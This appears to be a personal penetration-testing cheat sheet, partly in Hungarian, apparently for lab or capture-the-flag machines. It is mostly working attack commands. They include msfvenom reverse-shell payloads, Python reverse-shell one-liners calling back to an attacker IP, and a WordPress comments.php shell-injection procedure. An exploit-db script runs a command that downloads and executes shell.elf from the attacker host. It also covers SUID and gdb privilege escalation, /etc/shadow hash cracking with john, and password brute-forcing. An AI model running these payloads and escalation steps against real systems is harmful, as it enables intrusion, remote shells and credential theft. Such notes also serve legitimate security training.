
1. [Port scan](##Port-scan)

## Advanced_ping
``` sh
sudo nmap -sn <IP>
```
## Port-scan
``` sh
sudo nmap -sS -sV <IP>
```

## Dirbuster wordlist
``` sh
/usr/share/wordlists/dirb/common.txt
```

## Password list 
``` sh
/usr/share/wordlists/rockyou.txt
```

## Listener
``` sh
nc -lvnp 4444
```
``` sh
nc -lvnp 5555
```

## PHP reverse shell generator
``` sh
msfvenom -p php/reverse_php LHOST=30.0.1.17 LPORT=4444 -f raw > rshell.php
```
Ezt fel kell tölteni csinálni egy listeneret és lefuttatni a Target gépen, ezáltal kapunk egy PHP reverse shellt

## SHELL Chaining PHP esetén (nem PHP-nál is működik)
``` python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("30.0.1.17",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
``` python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("30.0.1.17",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

## Shell upgrade
``` python
python3 -c "import pty; pty.spawn('/bin/bash')"
```

# wpscan
wpscan --help
* --url URL    --> url megadása
* -o FILE      --> fájlba mentés
* -f FORMAT    --> mentés formátuma
* --detection-mode MODE --> passive, aggressive, mixed
* --user-agent AGENT --> agent megadása
* --random-user-agent
* --http-auth login:password --> Basic auth login
* -e --> mire vagyunk kíváncsiak
  * -e vp --> sérülékeny plugin
  * -e u --> minden user meghatározása
* -P --> jelszavak brute-forceolása
* --login-uri URI  --> ha az oldal nem az eredti IP-n található hanem máshol pl.: http://40.0.4.16/secret
* --stealthy --> elrejtőzés

## Web server megtalálása
Appearance --> Theme editor
Érdemes a comments.php-t buherálni
1. Shell kód generálása (msfvenom)
2. comments.php-be beírni
3. Listener attack gépen (nc)
4. Egy komment megnyitása

Vagy ami könnyebb v

## WordPress feltörés shell generálás
msfconsole
```
search wp admin shell
```
Ha megvan a szám akkor
```
use {szám}
```
vagy
```
use exploit/unix/webapp/wp_admin_shell_upload
```

## Meterpreter php script
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=30.0.1.17 LPORT=4444 -f raw > rshell.php
```
msfconsoleban
```
use exploit/multi/handler
```
Ez csak handler!!!

## betörés exploti python
3 külön terminal majd egyiken egy Listener majd egy másikban egy reverse shell(1) és egy python webserver ott ahol a exploit db s script van(python)(2) ezután feltöltjük(3). (1 2 3 egy mappában történjen)
```
msfvenom -p linux/x64/shell_reverse_tcp LPORT=4444 LHOST=30.0.1.17 -f elf > shell.elf
```
```
python3 -m http.server
```
```
python3 50457.py  40.0.5.16 80 /phpmyadmin pma pmapass "cd /tmp; rm -rf /tmp/shell.elf; wget http://30.0.1.17:8000/shell.elf;chmod 777 /tmp/shell.elf;/tmp/shell.elf"
```

# Linux PE (Privilige Excalaltion)
1. SUID bitek("meghatalmazás"): Ha egy futtatható fájlra ezt engedélyezzük, akkor a fájl nem az én jogaimmal indul majd el
   ### SUID bitek megkeresése
   ```
   find / -perm -u=s 2>/dev/null
   ```
   ### Használható fájlok
   - /usr/sbin/pppd
   - /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   - /usr/lib/openssh/ssh-keysign
   - /usr/lib/xorg/Xorg.wrap
   - /usr/libexec/polkit-agent-helper-1
   - /usr/bin/sudo
   - /usr/bin/su
   - /usr/bin/fusermount3
   - /usr/bin/pkexec
   - /usr/bin/gpasswd
   - /usr/bin/chfn
   - /usr/bin/mount
   - /usr/bin/chsh
   - /usr/bin/umount
   - /usr/bin/newgrp
   - /usr/bin/ntfs-3g
   - /usr/bin/passwd

    Ha van gdb
    ```
    gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
    ```
2. Sudo jogok: sudo -l
   - /etc/passwd  --> cat vagy ls -l  vagy /etc/shadow(jelszavak vannak itt)
     - Ha a jognál + jel van akkor
     ```
     getfacl /etc/passwd
     ```
     - catelés után jelszavak keresése $ on ként vannak részek első típus második is majd utána só és az utolsó a jelszó, ha megvan egy fájlba elmentjük majd `john`
       y: cript típus
     - jelszó feltörése: john (the ripper) vagy hashcat
       ```
       john <jelszofajl> --wordlist=/usr/share/wordlists/rockyou.txt (--format=crypt --> ha y típus)

       ```
 3. Python library hyjacking
 4. 

 ## Jelszó generálás
 ```
openssl passwd -5 alma
```
## Burpsuite
Firefox addon FoxyProxy
Proxy tab --> Intercept ON
Request küldése majd jobb klikk
Send to Repeater (jelszavak próbálgatása, manualisan)
Send to Intruder 
 Hozzáadjuk az add al, majd payload tab, megadjuk a jelszavakat és start attack, ezután nézzük a hosszakat

 ## Basic Authos
 hydra
